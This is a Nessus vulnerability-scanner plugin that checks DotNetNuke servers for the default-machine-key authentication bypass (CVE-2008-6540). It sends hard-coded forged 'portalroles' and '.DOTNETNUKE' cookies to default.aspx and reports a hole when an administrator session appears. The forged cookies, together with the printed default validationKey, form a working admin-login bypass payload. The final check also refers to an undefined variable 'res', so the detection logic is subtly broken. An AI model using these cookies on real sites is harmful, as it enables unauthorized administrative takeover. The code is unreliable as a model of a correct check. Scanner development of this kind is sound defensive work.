#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31643);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2008-6540");
  script_bugtraq_id(28391);
  script_xref(name:"Secunia", value:"29488");
  script_xref(name:"OSVDB", value:"43720");

  script_name(english:"DotNetNuke Upgrade Process validationkey Generation Weakness Privilege Escalation");
  script_summary(english:"Tries to gain access as administrator on DotNetNuke");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP.NET application that allows a
remote attacker to bypass authentication." );
 script_set_attribute(attribute:"description", value:
"The remote host is running DotNetNuke, a web application framework
written in ASP.Net. 

The version of DotNetNuke installed on the remote host appears to be
using a default machine key -- both 'ValidationKey' and
'DecryptionKey' -- for authentication token encryption and validation. 
A remote attacker can leverage this issue to bypass authentication and
gain administrative access to the affected application." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/489957" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ab60d96b" );
 script_set_attribute(attribute:"solution", value:
"Check that the value for 'validationKey' in DotNetNuke's ''web.config'
file is not set to 'F9D1A2D3E1D3E2F7B3D9F90FF3965ABDAC304902' and
upgrade to DotNetNuke version 4.8.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_asp(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/dotnetnuke", cgi_dirs()));
else dirs = make_list(cgi_dirs());

init_cookiejar();

foreach dir (dirs)
{
  # exploit
  set_http_cookie(name: "portalroles", value: "CB14B7E2553D9F6259ECF746F2D77FD15B05C5A10D98225339D6E282EFEFB3DA90D0747CEE5FAF2E7605B598311BA3349D25C108FBCEC7A0141BE6CDA83F2896342FBA33FFD8CB18D9A8896F30182B9EEB47786AB9574F6F3EBD9ECF56C389B401BCF744224A869F4C23D5E4280ACC8E16A2113C0770317F3A741630C77BB073871BE3E1E8A6F67AC5F0AC0582925D690B1D777C0302E18E");
  set_http_cookie(name: ".DOTNETNUKE", value: "6BBF011195DE71050782BD8E4A9B906F770FEDF87AE1FC32D31B27A14E2307BF986E438E06F4B28DD30706CB516290D5CE1513DD677E64A098F912E2F63E3BE3DDE63809B616F614");

  r = http_send_recv3(method: 'GET', item:string(dir, "/default.aspx"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if...
  if (
    # it's DotNetNuke and...
    '<!-- by DotNetNuke Corporation' >< r[2] &&
    # we're logged in as administrator
    '">Administrator Account</a>' >< r[2] &&
    '">Logout</a>' >< res
  )
  {
    security_hole(port);
    exit(0);
  }
}
